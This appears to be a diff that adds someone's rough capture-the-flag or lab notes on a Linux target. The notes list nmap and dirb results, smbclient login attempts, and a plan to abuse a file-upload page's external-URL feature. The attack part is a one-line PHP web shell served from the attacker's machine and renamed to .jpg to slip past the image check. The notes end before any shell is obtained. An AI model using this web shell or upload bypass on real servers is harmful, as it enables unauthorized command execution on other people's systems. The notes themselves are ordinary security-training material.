@@ -1,1 +1,117 @@
+nmap:
+22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
+80/tcp  open  http        Apache httpd 2.4.41 ((Ubuntu))
+139/tcp open  netbios-ssn Samba smbd 4.6.2
+445/tcp open  netbios-ssn Samba smbd 4.6.2
+
+
+dirb:
+/dirb/common.txt --> found 0
+/dirb/big.txt --> found /cloud/
+/dirbuster/medium --> found /css/
+
+
+
+
+
+
+
+
+
+
+
+
+
+smbclient -U user \\\\`cat ip`\\ -L 
+tried anoymous / guest / user / eveything with uppercase
+
+
+
+
+
+http://IP/
+
+redirect ->
+http://IP/login.php
+
+
+http://IP/cloud/ ->
+File Upload website
+
+it requests External Url
+
+>:)
+
+
+
+->
+pressed upload (with nothing)
+->
+Please select an image
+
+
+-> 
+nano r.php
+<?php system($_GET['c']);?>
+
+python -m http.server 80
+
+->
+in external url input
+http://10.8.56.244/r.php
+
+
+-> 
+no error
+->
+tried with a real picture
+http://10.10.248.97/cloud/images/dog.jpg
+
+
+
+->
+mv r.php r.php.jpg
+http://10.8.56.244/r.php.jpg
+no errors
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
